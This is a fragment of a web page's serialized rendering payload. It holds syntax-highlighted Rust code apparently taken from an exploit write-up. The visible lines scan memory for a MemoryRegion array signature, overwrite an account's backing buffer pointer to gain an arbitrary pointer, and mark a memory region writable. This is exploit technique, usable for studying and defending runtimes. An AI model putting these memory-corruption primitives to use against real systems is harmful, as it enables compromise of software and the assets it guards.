\"]}]\ndeb:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\ndec:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nded:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\ndee:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\ndef:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ndf0:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\ndf1:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\ndf2:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"$undefined"])</script><script>self.__next_f.push([1,"\",\"style\":{},\"children\":[\"    \"]}]\ndf3:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Signature matching for MemoryRegion array\"]}]\ndf4:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ndf5:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\ndf6:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\ndf7:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\ndf8:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ndf9:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ndfa:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ndfb:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ndfc:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"check_ptr \"]}]\ndfd:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\ndfe:[\"$\",\"span\",\"code-segment-71\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ndff:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x18\"]}]\ne00:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ne01:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne02:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\ne03:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne04:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"to"])</script><script>self.__next_f.push([1,"ken token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ne05:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\ne06:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne07:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\ne08:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ne09:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne0a:[\"$\",\"span\",\"code-segment-83\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}]\ne0b:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne0c:[\"$\",\"span\",\"code-segment-85\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x000000040020a238\"]}]\ne0d:[\"$\",\"span\",\"code-segment-86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne0e:[\"$\",\"span\",\"code-segment-87\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}]\ne0f:[\"$\",\"span\",\"code-segment-88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ne10:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\ne11:[\"$\",\"span\",\"code-segment-90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"       \"]}]\ne12:[\"$\",\"span\",\"code-segment-91\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ne13:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ne14:[\"$\",\"span\",\"code-segment-93\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ne15:[\"$\",\"span\",\"code-segment-94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"check_ptr \"]}]\ne16:[\"$\",\"span\",\"code-segment-95\",{\"classNam"])</script><script>self.__next_f.push([1,"e\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\ne17:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne18:[\"$\",\"span\",\"code-segment-97\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x58\"]}]\ne19:[\"$\",\"span\",\"code-segment-98\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ne1a:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne1b:[\"$\",\"span\",\"code-segment-100\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\ne1c:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne1d:[\"$\",\"span\",\"code-segment-102\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ne1e:[\"$\",\"span\",\"code-segment-103\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\ne1f:[\"$\",\"span\",\"code-segment-104\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne20:[\"$\",\"span\",\"code-segment-105\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\ne21:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ne22:[\"$\",\"span\",\"code-segment-107\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne23:[\"$\",\"span\",\"code-segment-108\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}]\ne24:[\"$\",\"span\",\"code-segment-109\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne25:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x0000000400202908\"]}]\ne26:[\"$\",\"span\",\"code-segment-111\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne27:[\"$\",\"span\",\"code-segment-112\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}]\ne28:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ne29:[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.2"])</script><script>self.__next_f.push([1,"5em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\ne2a:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"       \"]}]\ne2b:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ne2c:[\"$\",\"span\",\"code-segment-117\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ne2d:[\"$\",\"span\",\"code-segment-118\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ne2e:[\"$\",\"span\",\"code-segment-119\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"check_ptr \"]}]\ne2f:[\"$\",\"span\",\"code-segment-120\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\ne30:[\"$\",\"span\",\"code-segment-121\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne31:[\"$\",\"span\",\"code-segment-122\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x98\"]}]\ne32:[\"$\",\"span\",\"code-segment-123\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ne33:[\"$\",\"span\",\"code-segment-124\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne34:[\"$\",\"span\",\"code-segment-125\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\ne35:[\"$\",\"span\",\"code-segment-126\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne36:[\"$\",\"span\",\"code-segment-127\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ne37:[\"$\",\"span\",\"code-segment-128\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\ne38:[\"$\",\"span\",\"code-segment-129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne39:[\"$\",\"span\",\"code-segment-130\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\ne3a:[\"$\",\"span\",\"code-segment-131\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ne3b:[\"$\",\"span\",\"code-segment-132\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne3c:[\"$\",\"span\",\"code-segment-1"])</script><script>self.__next_f.push([1,"33\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}]\ne3d:[\"$\",\"span\",\"code-segment-134\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne3e:[\"$\",\"span\",\"code-segment-135\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x000000040020f308\"]}]\ne3f:[\"$\",\"span\",\"code-segment-136\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne40:[\"$\",\"span\",\"code-segment-137\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}]\ne41:[\"$\",\"span\",\"code-segment-138\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ne42:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[11]}]\ne43:[\"$\",\"span\",\"code-segment-140\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"       \"]}]\ne44:[\"$\",\"span\",\"code-segment-141\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ne45:[\"$\",\"span\",\"code-segment-142\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ne46:[\"$\",\"span\",\"code-segment-143\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ne47:[\"$\",\"span\",\"code-segment-144\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"check_ptr \"]}]\ne48:[\"$\",\"span\",\"code-segment-145\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\ne49:[\"$\",\"span\",\"code-segment-146\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne4a:[\"$\",\"span\",\"code-segment-147\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0xd8\"]}]\ne4b:[\"$\",\"span\",\"code-segment-148\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ne4c:[\"$\",\"span\",\"code-segment-149\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne4d:[\"$\",\"span\",\"code-segment-150\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\ne4e:[\"$\""])</script><script>self.__next_f.push([1,",\"span\",\"code-segment-151\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne4f:[\"$\",\"span\",\"code-segment-152\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ne50:[\"$\",\"span\",\"code-segment-153\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\ne51:[\"$\",\"span\",\"code-segment-154\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne52:[\"$\",\"span\",\"code-segment-155\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\ne53:[\"$\",\"span\",\"code-segment-156\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ne54:[\"$\",\"span\",\"code-segment-157\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne55:[\"$\",\"span\",\"code-segment-158\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}]\ne56:[\"$\",\"span\",\"code-segment-159\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne57:[\"$\",\"span\",\"code-segment-160\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x0000000400000000\"]}]\ne58:[\"$\",\"span\",\"code-segment-161\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne59:[\"$\",\"span\",\"code-segment-162\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\ne5a:[\"$\",\"span\",\"code-segment-163\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ne5b:[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[12]}]\ne5c:[\"$\",\"span\",\"code-segment-165\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\ne5d:[\"$\",\"span\",\"code-segment-166\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Bingo!\"]}]\ne5e:[\"$\",\"span\",\"code-segment-167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ne5f:[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"dis"])</script><script>self.__next_f.push([1,"play\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[13]}]\ne60:[\"$\",\"span\",\"code-segment-169\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\ne61:[\"$\",\"span\",\"code-segment-170\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\ne62:[\"$\",\"span\",\"code-segment-171\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ne63:[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[14]}]\ne64:[\"$\",\"span\",\"code-segment-173\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\ne65:[\"$\",\"span\",\"code-segment-174\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\ne66:[\"$\",\"span\",\"code-segment-175\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ne67:[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[15]}]\ne68:[\"$\",\"span\",\"code-segment-177\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\ne69:[\"$\",\"span\",\"code-segment-178\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\ne6a:[\"$\",\"span\",\"code-segment-179\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ne6b:[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[16]}]\ne6c:[\"$\",\"span\",\"c"])</script><script>self.__next_f.push([1,"ode-segment-181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\ne6d:[\"$\",\"span\",\"code-segment-182\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\ne6e:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ne6f:[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}]\ne70:[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}]\ne71:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\ne72:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Overwrite POINTER account's backing buffer pointer (arb_ptr)\"]}]\ne73:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ne74:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\ne75:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\ne76:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ne77:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ne78:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ne79:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_"])</script><script>self.__next_f.push([1,"ptr \"]}]\ne7a:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\ne7b:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne7c:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x490\"]}]\ne7d:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ne7e:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne7f:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\ne80:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne81:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ne82:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\ne83:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne84:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\ne85:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ne86:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne87:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\ne88:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" thread_mem\"]}]\ne89:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\ne8a:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ne8b:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\ne8c:[\""])</script><script>self.__next_f.push([1,"$\",\"span\",\"code-segment-63\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\ne8d:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Set memory region state to writable\"]}]\ne8e:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ne8f:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\ne90:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\ne91:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ne92:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ne93:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ne94:[\"$\",\"span\",\"code-segment-71\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}]\ne95:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\ne96:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne97:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x4b8\"]}]\ne98:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ne99:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne9a:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\ne9b:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne9c:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ne9d:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"m"])</script><script>self.__next_f.push([1,"ut\"]}]\ne9e:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ne9f:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\nea0:[\"$\",\"span\",\"code-segment-83\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nea1:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nea2:[\"$\",\"span\",\"code-segment-85\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\nea3:[\"$\",\"span\",\"code-segment-86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" 